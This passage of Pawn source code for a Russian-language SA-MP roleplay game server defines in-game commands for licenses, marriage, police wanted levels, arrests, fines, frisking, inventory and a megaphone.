	format(YCMDstr, sizeof(YCMDstr), " Лицензия на оружие:  %s",(!PTEMP[playerid][pGunLic])?("Нет") : ("Есть"));
	SCM(playerid, 0xC5EEFEAA, YCMDstr);
	SCM(playerid, 0x59bd3aa, "=============================");
	return true;
}
CMD:showlicenses(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(sscanf(params, "u", params[0])) return SCM(playerid, -1, " Введите: /showlicenses [playerid]");
	if(!IsPlayerConnected(params[0])) return SCM(playerid,COLOR_GREY, " Игрок оффлайн");
	if(params[0] == playerid) return SCM(playerid,COLOR_GREY, " Чтобы посмотреть лицензии введите /licenses");
	if(!ProxDetectorS(8.0, playerid, params[0])) return true;
	format(YCMDstr, sizeof(YCMDstr), "-----------===[ LICENSES %s ]===-----------", Name(playerid));
	SCM(params[0], 0x59bd3aa, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Водительские права:  %s",(!PTEMP[playerid][pCarLic])?("Нет") : ("Есть"));
	SCM(params[0], 0xc5eefeaa, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Лицензия пилота:  %s",(!PTEMP[playerid][pFlyLic])?("Нет") : ("Есть"));
	SCM(params[0], 0xc5eefeaa, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Лицензия на катера:  %s",(!PTEMP[playerid][pBoatLic])?("Нет") : ("Есть"));
	SCM(params[0], 0xc5eefeaa, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Лицензия рыболова:  %s",(!PTEMP[playerid][pFishLic])?("Нет") : ("Есть"));
	SCM(params[0], 0xc5eefeaa, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Лицензия на оружие:  %s",(!PTEMP[playerid][pGunLic])?("Нет") : ("Есть"));
	SCM(params[0], 0xc5eefeaa, YCMDstr);
	SCM(playerid, 0x59bd3aa, "=============================");
	SendMes(playerid, COLOR_BLUE, " Вы показали свои лицензии %s", Name(params[0]));
	format(YCMDstr,sizeof(YCMDstr), " %s показал свои лицензии %s'у",Name(playerid),Name(params[0]));
	ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	format(YCMDstr,sizeof(YCMDstr), "Показал свои лицензии %s'у",Name(params[0]));
	SetPlayerChatBubble(playerid,YCMDstr,COLOR_PURPLE,30.0,10000);
	return true;
}
CMD:divorce(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	SCM(playerid, 0x6ab1ffaa, " У вас больше нет жены / мужа");
	ClearMarriage(playerid);
	return true;
}
CMD:propose(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pCash] < 100000) return SCM(playerid, COLOR_GREY, " Вам нужно 100 000 на свадьбу!");
	if(strcmp(PTEMP[playerid][pMarriedTo],"-",true) != 0) return SCM(playerid, COLOR_GREY, " Вы уже женаты/замужем!");
	if(sscanf(params, "u", params[0])) return SCM(playerid, -1, " Введите: /propose [playerid]");
	if(!IsPlayerConnected(params[0])) return SCM(playerid, COLOR_GREY, " Игрок оффлайн!");
	if(strcmp(PTEMP[params[0]][pMarriedTo],"-",true) != 0) return SCM(playerid, COLOR_GREY, " Человек уже состоит в браке!");
	if(!ProxDetectorS(8.0, playerid, params[0])) return SCM(playerid, COLOR_GREY, " Необходимо находиться рядом друг с другом!");
	if(params[0] == playerid) { SCM(playerid, COLOR_GREY, " Вы не можете жениться/выйти замуж на самом себе!"); return true; }
	format(YCMDstr, sizeof(YCMDstr), "{0289CC} Вы предложили выйти замуж / пожениться %s",Name(params[0]));
	SCM(playerid, 0x6495EDFF, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " %s предлагает вам руку и сердце. (( Введите: /accept marriage, чтобы принять )).",Name(playerid));
	SCM(params[0], COLOR_BLUE, YCMDstr);
	ProposeOffer[params[0]] = playerid;
	return true;
}
CMD:suspect(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new reason[32];
	if (GetPVarInt(playerid,"Fraction_Duty") && PTEMP[playerid][pMember] == 1 || GetPVarInt(playerid,"Fraction_Duty") && PTEMP[playerid][pLeader] == 1
	||GetPVarInt(playerid,"Fraction_Duty") && PTEMP[playerid][pMember] == 2 || GetPVarInt(playerid,"Fraction_Duty") && PTEMP[playerid][pLeader] == 2
	|| GetPVarInt(playerid,"Fraction_Duty") && PTEMP[playerid][pMember] == 10 || GetPVarInt(playerid,"Fraction_Duty") && PTEMP[playerid][pLeader] == 10
	|| GetPVarInt(playerid,"Fraction_Duty") && PTEMP[playerid][pMember] == 21 || GetPVarInt(playerid,"Fraction_Duty") && PTEMP[playerid][pLeader] == 21)
	{
	    if(sscanf(params, "uds[32]", params[0],params[1],reason)) return SCM(playerid, -1, " Введите: (/su)spect [id игрока] [уровень розыска] [причина]");
		if(!IsPlayerConnected(params[0])) return true;
		if(params[0] == INVALID_PLAYER_ID) return true;
		if(PTEMP[params[0]][pJailTime] != 0) return SCM(playerid, COLOR_GREY, " Человек находится в камере");
		if(PTEMP[params[0]][pWantedLevel] >= 3 && PTEMP[playerid][pMember] == 1 && PTEMP[playerid][pMember] == 10 && PTEMP[playerid][pMember] == 21) return SCM(playerid, COLOR_GREY, " У данного игрока уже 3 уровней розыска!");
		if(PTEMP[params[0]][pWantedLevel] >= 6) return SCM(playerid, COLOR_GREY, " У данного игрока уже 6 уровней розыска!");
		if(IsACop(params[0]) && GetPVarInt(params[0], "Fraction_Duty")) return SCM(playerid, COLOR_GRAD2, " Вы не можете давать розыск законникам!");
		PTEMP[params[0]][pWantedLevel] +=params[1];
		SetPlayerWantedLevel(params[0],PTEMP[params[0]][pWantedLevel]);
		SetPlayerCriminal(params[0],Name(playerid), reason);
		return true;
	}
	else SCM(playerid, COLOR_GREY, " Вам недоступна эта функция!");
	return true;
}
CMD:spawnchange(playerid)
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	//if(PTEMP[playerid][pMember] == 0) return SCM(playerid,COLOR_GREY," Вы должны состоять в организации!");
	if(!HGet(playerid) && !KGet(playerid)) return SCM(playerid,COLOR_GREY," Вы не имеете дома/квартиры!");
	if(PTEMP[playerid][pMember] == 19 && PTEMP[playerid][pRank] < 2) return true;
	if(PTEMP[playerid][pMember] == 3 && PTEMP[playerid][pRank] < 2) return true;
	if(GetPVarInt(playerid, "Fraction_Duty"))
	{
		if(PTEMP[playerid][pMember] == 4)
		{
			ShowPlayerDialogEx(playerid, 11052, DIALOG_STYLE_LIST, "Выбор спавна", "[0] Дом\n[1] База фракции 1\t[SFMC]\n[2] База фракции 2\t[ASGH]\n[3] База фракции 3\t[LVMC]\n[4] База фракции 4\t[FCMC]\n[5] База фракции 5\t[CGH]", "Выбор", "Отмена");
		}
		else
		ShowPlayerDialogEx(playerid, 11052, DIALOG_STYLE_LIST, "Выбор спавна", "[0] Дом\n[1] База фракции", "Выбор", "Отмена");
	}
	else ShowPlayerDialogEx(playerid, 11052, DIALOG_STYLE_LIST, "Выбор спавна", "[0] Дом\n[1] Вокзал", "Выбор", "Отмена");
	//if(PTEMP[playerid][pSpawnChange] == 1) PTEMP[playerid][pSpawnChange] = 0, SCM(playerid, -1, " Теперь вы будете возраждаться на базе организации!");
	//else SCM(playerid, -1, " Теперь вы будете возраждаться в обычном месте!"), PTEMP[playerid][pSpawnChange] = 1;
	return true;
}
CMD:home(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(HGet(playerid))
	{
		SetPlayerCheckpoint(playerid,HouseInfo[PTEMP[playerid][pPHouseKey]][hEntrancex], HouseInfo[PTEMP[playerid][pPHouseKey]][hEntrancey], HouseInfo[PTEMP[playerid][pPHouseKey]][hEntrancez], 4.0);
		SCM(playerid, 0x30a0a7aa, " На радаре отмечено место, где находится ваш дом. Используйте /GPS чтобы убрать метку");
		gPlayerCheckpointStatus[playerid] = 12;
	}
	else if(KGet(playerid))
	{
		new i = PTEMP[playerid][pKvartiraKey];
		SetPlayerCheckpoint(playerid,PodeezdInfo[kvartinfo[i][virtmir]][podPicX], PodeezdInfo[kvartinfo[i][virtmir]][podPicY], PodeezdInfo[kvartinfo[i][virtmir]][podPicZ], 4.0);
		format(YCMDstr,sizeof(YCMDstr)," Ваш подъезд обозначен на карте красной меткой. Номер подъезда: %i",kvartinfo[i][virtmir]-1);
		SCM(playerid, 0x30a0a7aa,YCMDstr);
		gPlayerCheckpointStatus[playerid] = 12;
	}
	return true;
}
//#5
CMD:clear(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new giveplayerid;
	new sendername[MAX_PLAYER_NAME];
	new giveplayer[MAX_PLAYER_NAME];
	if(!IsInCopCar(playerid)) return SCM(playerid, COLOR_GRAD1, " Вы не в патрульном авто");
	if(sscanf(params, "u", giveplayerid)) return  SCM(playerid, -1, " Введите: /clear [id игрока]");
	if(IsPlayerConnected(giveplayerid))
	{
		if(giveplayerid != INVALID_PLAYER_ID) { } else {SCM(playerid, COLOR_GREY, " [Ошибка] Человек не найден!");}
		{
		    if(PTEMP[giveplayerid][pWantedLevel] < 1) return SCM(playerid, COLOR_GREY, " Человек не в розыске");
			GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
			GetPlayerName(playerid, sendername, sizeof(sendername));
			format(string, 128, " Вы сняли розыск с %s.", giveplayer);
			SCM(playerid, 0x6495EDFF, string);
			format(string, 128, " %s снял с вас розыск.", sendername);
			SCM(giveplayerid, 0x6495EDFF, string);
			PTEMP[giveplayerid][pWantedLevel] =0;
			SetPlayerWantedLevel(giveplayerid, 0);
		}
	}
	foreach(i)
	{
		if(GetPVarInt(playerid, "Fraction_Duty") && (PTEMP[i][pMember] == 1 ||PTEMP[i][pLeader] == 1 || PTEMP[i][pMember] == 10 ||PTEMP[i][pLeader] == 10 || PTEMP[i][pMember] == 2 || PTEMP[i][pLeader] == 2 || PTEMP[i][pMember] == 21 || PTEMP[i][pLeader] == 21))
		{
			format(string, 144, " [Clear] %s удалил из розыскиваемых %s",Name(playerid),Name(giveplayerid));
			SCM(i, 0xffc801c8,string);
		}
	}
	return true;
}
CMD:ticket(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsACop(playerid)) return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция");
	if(sscanf(params, "uds[54]",params[0],params[1],params[2])) return	SCM(playerid, -1, " Введите: /ticket [id] [цена] [причина]");
	if(params[1] < 1 || params[1] > 10000) { SCM(playerid, COLOR_GREY, " Штраф не должен привышать 10000 и не должен быть меньше 0 вирт!"); return true; }
	if(!IsPlayerConnected(params[0])) return true;
	if(!ProxDetectorS(8.0, playerid, params[0])) return true;
	if(GetSRVMoney(params[0]) < params[1]) 	return 	SCM(playerid, COLOR_GRAD1, " У этого  нет столько денег!");
	if(params[0] == playerid) { SCM(playerid, COLOR_GREY, " [Ошибка] Вы указали свой ID"); return true; }
	format(YCMDstr, sizeof(YCMDstr), " Вы выписали штраф в размере %i вирт %s. Причина: %s",params[1],Name(params[0]),params[2]);
	SCM(playerid, COLOR_BLUE, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Офицер %s выписал вам штраф в размере %i вирт. Причина: %s",Name(playerid),params[1],params[2]);
	SCM(params[0], COLOR_BLUE, YCMDstr);
	SCM(params[0], -1, " (( Введите: /accept ticket, чтобы оплатить штраф ))");
	TicketOffer[params[0]] = playerid;
	TicketMoney[params[0]] = params[1];
	return true;
}
CMD:spveh(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	new Float:pos;
	if(sscanf(params, "f",pos)) return SCM(playerid,COLOR_GRAD2, " Введите: /spveh [радиус]");
	new Float:car_x,Float:car_y,Float:car_z;
	for(new cars=0;cars<MAX_VEHICLES;cars++)
	{
		if(GetVehicleModel(cars) > 399)
		{
			GetVehiclePos(cars,car_x,car_y,car_z);
			if(IsPlayerInRangeOfPoint(playerid,pos,car_x,car_y,car_z)) SetVehicleToRespawn(cars);
		}
	}
	return true;
}
CMD:arrest(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(GetPVarInt(playerid,"Fraction_Duty") && PTEMP[playerid][pMember] == 1 || GetPVarInt(playerid,"Fraction_Duty") && PTEMP[playerid][pMember] == 2 || GetPVarInt(playerid,"Fraction_Duty") && PTEMP[playerid][pMember] == 10 || GetPVarInt(playerid,"Fraction_Duty") && PTEMP[playerid][pMember] == 21)
	if(PlayerToPoint(6.0, playerid, 268.3327,77.8972,1001.0391) || PlayerToPoint(6.0, playerid, 227.7436,114.5075,999.0156) || PlayerToPoint(6.0, playerid, 198.1339,158.4835,1003.0234)|| PlayerToPoint(6.0, playerid, 218.2263,114.9286,999.0156) || PlayerToPoint(6.0, playerid, 198.3940,157.9389,1003.0234))
	{
		if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /arrest [id игрока]");
		if(params[0] == playerid) return SCM(playerid, COLOR_GREY, " Вы указали свой ID");
		if(!IsPlayerConnected(params[0])) return true;
		if(!ProxDetectorS(4.0, playerid, params[0])) return true;
		if(PTEMP[params[0]][pWantedLevel] < 1) return  SCM(playerid, COLOR_GREY, " Человек должен иметь хотя бы один уровень розыска!");
		if(PTEMP[playerid][pKeys] < 1) return SCM(playerid, COLOR_GREY, " У вас нет ключей от камеры");
		format(YCMDstr, sizeof(YCMDstr), " Вы посадили в тюрьму %s на %d секунд",Name(params[0]),PTEMP[params[0]][pWantedLevel]*600);
		SCM(playerid, COLOR_BLUE, YCMDstr);
		format(YCMDstr, sizeof(YCMDstr), " Вас посадили в тюрьму %s на %d секунд",Name(playerid),PTEMP[params[0]][pWantedLevel]*600);
		SCM(params[0], COLOR_BLUE, YCMDstr);
		SCM(params[0],-1," Ваша узнаваемость понизилась");
		PTEMP[playerid][pPayCheck]+= 200*PTEMP[params[0]][pWantedLevel];
		DelGun(params[0]);
		foreach(i)
		{
			if(GetPVarInt(playerid, "Fraction_Duty") && (PTEMP[i][pMember] == 1 ||PTEMP[i][pLeader] == 1 || PTEMP[i][pMember] == 10 ||PTEMP[i][pLeader] == 10 || PTEMP[i][pMember] == 2 ||PTEMP[i][pLeader] == 2 || PTEMP[i][pMember] == 21 || PTEMP[i][pLeader] == 21))
			{
				switch(PTEMP[playerid][pMember])
				{
							case 1,10,21: format(YCMDstr, sizeof(YCMDstr), " << Офицер %s арестовал %s >>",Name(playerid),Name(params[0])),SCM(i, COLOR_LIGHTRED,YCMDstr);
							case 2: format(YCMDstr, sizeof(YCMDstr), " << Агент FBI %s арестовал %s >>",Name(playerid),Name(params[0])),SCM(i, COLOR_LIGHTRED,YCMDstr);
				}
			}
		}
		new konv = GetPVarInt(playerid, "TempConvoi");
		if(params[0] == konv)
		{
			SetPVarInt(playerid, "TempConvoi", -1);
			Convoi[params[0]] = 9999;
			KillTimer(TimerForPlayer[params[0]]);
			TimerForPlayer[params[0]] = INVALID_PLAYER_ID;
			ClearAnimations(playerid);
			TogglePlayerControllable(params[0], 0);
		}
		SetPlayerSpecialAction(params[0],SPECIAL_ACTION_NONE);
		RemovePlayerAttachedObject(params[0],0);
		PlayerCuffed[params[0]] = 0;
		PlayerCuffedTime[params[0]] = 0;
		if(PlayerToPoint(6.0, playerid, 268.3327,77.8972,1001.0391))
		{
			SetPlayerInterior(params[0], 6);
			SetPlayerPos(params[0],264.1425,77.4712,1001.0391);
			SetPlayerFacingAngle(params[0], 263.0160);
			PTEMP[params[0]][pJailTime] = PTEMP[params[0]][pWantedLevel]*600;
			PTEMP[params[0]][pWantedLevel] = 0;
			PTEMP[params[0]][pArrested] += 1;
			PTEMP[params[0]][pMestoJail] = 1;
			SetPlayerWantedLevel(params[0], 0);
			TogglePlayerControllable(params[0], 1);
		}
		else if(PlayerToPoint(6.0, playerid, 218.2263,114.9286,999.0156))
		{
			SetPlayerInterior(params[0], 10);
			SetPlayerPos(params[0],219.5400,109.9767,999.0156);
			SetPlayerFacingAngle(params[0], 1.0000);
			PTEMP[params[0]][pJailTime] = PTEMP[params[0]][pWantedLevel]*600;
			PTEMP[params[0]][pWantedLevel] = 0;
			PTEMP[params[0]][pArrested] += 1;
			PTEMP[params[0]][pMestoJail] = 2;
			SetPlayerWantedLevel(params[0], 0);
			TogglePlayerControllable(params[0], 1);
		}
		else if(PlayerToPoint(6.0, playerid, 198.3940,157.9389,1003.0234))
		{
			SetPlayerInterior(params[0], 3);
			SetPlayerPos(params[0],198.3642,161.8103,1003.0300);
			SetPlayerFacingAngle(params[0], 1.0000);
			PTEMP[params[0]][pJailTime] = PTEMP[params[0]][pWantedLevel]*600;
			PTEMP[params[0]][pWantedLevel] = 0;
			PTEMP[params[0]][pArrested] += 1;
			PTEMP[params[0]][pMestoJail] = 3;
			SetPlayerWantedLevel(params[0], 0);
			TogglePlayerControllable(params[0], 1);
		}
	}
	return true;
}
CMD:fare(playerid, params[])
{
	if(!PTEMP[playerid][pLogin] || PTEMP[playerid][pJob] != 4) return true;
	if(GetPVarInt(playerid,"TaxiDuty") > 0)
	{
		Delete3DTextLabel(JobText3D[GetPVarInt(playerid,"rentcar_job")]);
		DeletePVar(playerid,"TaxiDuty");
		return true;
	}
	new Veh = GetPlayerVehicleID(playerid);
	if(Veh != GetPVarInt(playerid,"rentcar_job")) return SCM(playerid,COLOR_GREY," Это не ваш автомобиль");
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SCM(playerid,COLOR_GREY," Вы должны находиться за рулем автомобиля!");
	if((Veh >= taxicar[0] && Veh <= taxicar[68]) || (Veh >= taxi5lvlcar[0] && Veh <= taxi5lvlcar[9]) || (Veh >= taxi10lvlcar[0] && Veh <= taxi10lvlcar[10]) || (Veh >= taxi40lvlcar[0] && Veh <= taxi40lvlcar[6]))
	{
		SetPVarInt(playerid,"TaxiDuty",Veh);
		JobText3D[Veh] = Create3DTextLabel("<< Бесплатное такси >>", 0xFFFF00FF, 9999.0, 9999.0, 9999.0, 30.0,0,1);
		Attach3DTextLabelToVehicle(JobText3D[Veh], Veh, 0, 0, 1.5);
	}
	return true;
}
CMD:inventory(playerid)
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new strs[32];
 	new frisking[512];
 	format(frisking, sizeof(frisking), "Key\tВещи\tКоличество\n");
	if(PTEMP[playerid][pDrugs] > 0){
	    format(strs, sizeof(strs), "A\tНаркотики\t%i\n",PTEMP[playerid][pDrugs]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PTEMP[playerid][pMats] > 0){
	    format(strs, sizeof(strs), "B\tМатериалы\t%i\n",PTEMP[playerid][pMats]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PTEMP[playerid][pDirectory] == 1){
	    format(strs, sizeof(strs), "C\tТелефонная книга\t%i\n",PTEMP[playerid][pDirectory]);
		strcat(frisking, strs, sizeof(frisking));
 	}
    format(strs, sizeof(strs), "D\tCD-Player\t%i\n",1);
	strcat(frisking, strs, sizeof(frisking));
	if(PTEMP[playerid][pFishes] > 0.0){
	    format(strs, sizeof(strs), "E\tРыба\t%f\n",PTEMP[playerid][pFishes]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PTEMP[playerid][pKeys] > 0){
	    format(strs, sizeof(strs), "F\tКлючи от камеры\t%i\n",PTEMP[playerid][pKeys]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PTEMP[playerid][pMushrooms] > 0){
	    format(strs, sizeof(strs), "J\tГрибы\t%i\n",PTEMP[playerid][pMushrooms]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PTEMP[playerid][pCarLic] == 1){
	    format(strs, sizeof(strs), "K\tВодительские права\t%i\n",PTEMP[playerid][pCarLic]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PTEMP[playerid][pFlyLic] == 1){
	    format(strs, sizeof(strs), "L\tЛицензия пилота\t%i\n",PTEMP[playerid][pFlyLic]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PTEMP[playerid][pBoatLic] == 1){
	    format(strs, sizeof(strs), "M\tЛицензия на лодки\t%i\n",PTEMP[playerid][pBoatLic]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PTEMP[playerid][pFishLic] == 1){
	    format(strs, sizeof(strs), "N\tЛицензия на рыболовство\t%i\n",PTEMP[playerid][pFishLic]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PTEMP[playerid][pGunLic] == 1){
	    format(strs, sizeof(strs), "O\tЛицензия на оружие\t%i\n",PTEMP[playerid][pGunLic]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	new bool:label = false;
	for(new i = 0; i < 46; i++)
		if(Weapons[playerid][i] > 0)
			label = true;
	if(label){
		format(strs, sizeof(strs), "P\tОружие\t%i\n",1);
		strcat(frisking, strs, sizeof(frisking));
	}
	ShowPlayerDialogEx(playerid, 7780, DIALOG_STYLE_TABLIST_HEADERS, "Инвентарь", frisking, "Закрыть", "");
	return true;
}
CMD:frisk(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsACop(playerid) || GetPVarInt(playerid, "Fraction_Duty") == 0)
	{
		if(PTEMP[playerid][pAdmin] < 4) return SCM(playerid,COLOR_GREY," Вам недоступна эта функция");
	}
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /frisk [ид игрока]");
	if(!IsPlayerConnected(params[0])) return true;
	if(!ProxDetectorS(3.0, playerid, params[0]) || Spectate[playerid] == 1) return SCM(playerid, COLOR_GREY, " Этот человек далеко от вас");
	if(params[0] == playerid) return SCM(playerid, COLOR_GREY, " Вы не можете обыскать себя!");
	new strs[32];
 	new frisking[512];
 	format(frisking, sizeof(frisking), "Key\tВещи\tКоличество\n");
	if(PTEMP[params[0]][pDrugs] > 0){
	    format(strs, sizeof(strs), "A\tНаркотики\t%i\n",PTEMP[params[0]][pDrugs]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PTEMP[params[0]][pMats] > 0){
	    format(strs, sizeof(strs), "B\tМатериалы\t%i\n",PTEMP[params[0]][pMats]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PTEMP[params[0]][pDirectory] == 1){
	    format(strs, sizeof(strs), "C\tТелефонная книга\t%i\n",PTEMP[params[0]][pDirectory]);
		strcat(frisking, strs, sizeof(frisking));
 	}
    format(strs, sizeof(strs), "D\tCD-Player\t%i\n",1);
	strcat(frisking, strs, sizeof(frisking));
	if(PTEMP[params[0]][pFishes] > 0.0){
	    format(strs, sizeof(strs), "E\tРыба\t%f\n",PTEMP[params[0]][pFishes]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PTEMP[params[0]][pKeys] > 0){
	    format(strs, sizeof(strs), "F\tКлючи от камеры\t%i\n",PTEMP[params[0]][pKeys]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PTEMP[params[0]][pMushrooms] > 0){
	    format(strs, sizeof(strs), "J\tГрибы\t%i\n",PTEMP[params[0]][pMushrooms]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PTEMP[params[0]][pCarLic] == 1){
	    format(strs, sizeof(strs), "K\tВодительские права\t%i\n",PTEMP[params[0]][pCarLic]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PTEMP[params[0]][pFlyLic] == 1){
	    format(strs, sizeof(strs), "L\tЛицензия пилота\t%i\n",PTEMP[params[0]][pFlyLic]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PTEMP[params[0]][pBoatLic] == 1){
	    format(strs, sizeof(strs), "M\tЛицензия на лодки\t%i\n",PTEMP[params[0]][pBoatLic]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PTEMP[params[0]][pFishLic] == 1){
	    format(strs, sizeof(strs), "N\tЛицензия на рыболовство\t%i\n",PTEMP[params[0]][pFishLic]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	if(PTEMP[params[0]][pGunLic] == 1){
	    format(strs, sizeof(strs), "O\tЛицензия на оружие\t%i\n",PTEMP[params[0]][pGunLic]);
		strcat(frisking, strs, sizeof(frisking));
 	}
 	new bool:label = false;
	for(new i = 0; i < 46; i++)
		if(Weapons[params[0]][i] > 0)
			label = true;
	if(label){
		format(strs, sizeof(strs), "P\tОружие\t%i\n",1);
		strcat(frisking, strs, sizeof(frisking));
	}
	ShowPlayerDialogEx(playerid, 7779, DIALOG_STYLE_TABLIST_HEADERS, "Карманы", frisking, "Забрать", "Отмена");
	format(YCMDstr, sizeof(YCMDstr), " %s обыскал %s", Name(playerid) ,Name(params[0]));
	ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	SetPVarInt(playerid, "FriskID", params[0]);
	return true;
}
CMD:wanted(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new sctring[500];
	if(!IsACop(playerid)) return SCM(playerid, COLOR_GREY, " Вы не законник");
	foreach(i)
	{
		if(PTEMP[i][pWantedLevel] >= 1)
		{
			format(YCMDstr,sizeof(YCMDstr), "%s\t|\tУровень розыска: %i\n",Name(i),PTEMP[i][pWantedLevel]);
			strcat(sctring,YCMDstr);
		}
	}
	if (strlen(sctring) > 1) ShowPlayerDialogEx(playerid, 11349,DIALOG_STYLE_MSGBOX, "Розыскиваются", sctring, "Закрыть", "");
	else SCM(playerid,-1,"Нет розыскиваемых");
	return true;
}
CMD:mdc(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsACop(playerid)) return SCM(playerid,0xafafafaa, " Вам недоступна эта функция");
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /mdc [id игрока]");
	if(!IsPlayerConnected(params[0])) return true;
	SCM(playerid, TEAM_BLUE_COLOR, "---======== МОБИЛЬНЫЙ КОМПЬЮТЕР ДАННЫХ ========---");
	format(YCMDstr, sizeof(YCMDstr), " Имя: %s", Name(params[0])), SCM(playerid, -1,YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Преступление: %s", PlayerCrime[params[0]][pAccusedof]), SCM(playerid, COLOR_GRAD2,YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Сообщил: %s", PlayerCrime[params[0]][pVictim]), SCM(playerid, COLOR_GRAD3,YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Уровень розыска: %i", PTEMP[params[0]][pWantedLevel]), SCM(playerid, COLOR_GRAD4,YCMDstr);
	SCM(playerid, TEAM_BLUE_COLOR, "---============================================---");
	return true;
}
CMD:givemf(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 3) return true;
	if(sscanf(params, "u", params[0])) return SCM(playerid, -1, " Введите: /givemf [playerid]");
	if(GiveMF[params[0]])
	{
	    GiveMF[params[0]] = false;
	    format(YCMDstr, sizeof(YCMDstr), " Вы забрали у игрока мегафон", Name(params[0]));
	    SCM(playerid, COLOR_BLUE, YCMDstr);
	} else {
	    GiveMF[params[0]] = true;
		format(YCMDstr, sizeof(YCMDstr), " Вы дали игроку мегафон. Чтобы его использовать, нужно ввести команду /m", Name(params[0]));
	    SCM(playerid, COLOR_BLUE, YCMDstr);
	}
	return true;
}
CMD:megaphone(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsPlayerConnected(playerid)) return true;
	if(sscanf(params, "s[128]",params[0])) return SCM(playerid, -1, " Введите: (/m)egaphone [текст]");
	if(GiveMF[playerid]) {
	    format(YCMDstr, sizeof(YCMDstr), " {{ %s: %s }}", Name(playerid), params[0]);
	    return ProxDetector(80.0, playerid, YCMDstr,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
	}
	switch(PTEMP[playerid][pMember])
	{
	case 1,10,21:
		{
			if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 427 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 523 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 596 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 497) return SCM(playerid, COLOR_GRAD2, " Вы не в полицейской машине");
			format(YCMDstr, sizeof(YCMDstr), " {{ Офицер %s: %s }}",Name(playerid),params[0]);
			ProxDetector(80.0, playerid, YCMDstr,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
		}
	case 3,19:
		{
			new carid = GetPlayerVehicleID(playerid);
			if(GetVehicleModel(carid) != 425
					&& GetVehicleModel(carid) != 470
					&& GetVehicleModel(carid) != 433
					&& GetVehicleModel(carid) != 432
					&& GetVehicleModel(carid) != 520
					&& GetVehicleModel(carid) != 500
					&& GetVehicleModel(carid) != 497
					&& GetVehicleModel(carid) != 548) return SCM(playerid, COLOR_GRAD2, " Вы не в солдатской машине");
			format(YCMDstr, sizeof(YCMDstr), "{{ Солдат %s: %s }}",Name(playerid),params[0]);
			ProxDetector(80.0, playerid, YCMDstr,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
		}
	case 2:
		{
			if(GetPlayerVehicleID(playerid) >= fbicar[0] && GetPlayerVehicleID(playerid) <= fbicar[16])
			{
				format(YCMDstr, sizeof(YCMDstr), " {{ Агент FBI %s: %s }}",Name(playerid),params[0]);
				ProxDetector(80.0, playerid, YCMDstr,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
			} else return SCM(playerid, COLOR_GREY, " Вы не в служебном автомобиле");
		}
